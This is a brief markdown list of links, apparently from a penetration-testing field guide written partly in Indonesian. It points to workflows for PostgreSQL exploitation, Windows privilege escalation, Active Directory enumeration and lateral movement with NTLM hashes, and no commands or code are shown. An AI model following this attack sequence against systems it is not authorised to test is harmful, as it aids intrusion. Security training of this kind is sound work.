> - **`[14c. PostgreSQL Exploitation Workflow — Master Field Guide](/docs/postgresql)`** — Jika ada port 5432 (PostgreSQL, sering di Linux)
> - **`[🪟 45 — Windows Privilege Escalation Workflow](/docs/windows-privesc)`** — Jika dapat shell dan perlu escalate privilege
> - **`[🏰 35 — Active Directory Initial Enumeration Workflow](/docs/ad-initial-enumeration)`** — Jika environment AD dan punya domain credentials
> - **`[🧭 Workflow 42 — Lateral Movement](/docs/lateral-movement)`** — Jika dapat NTLM hashes untuk lateral movement

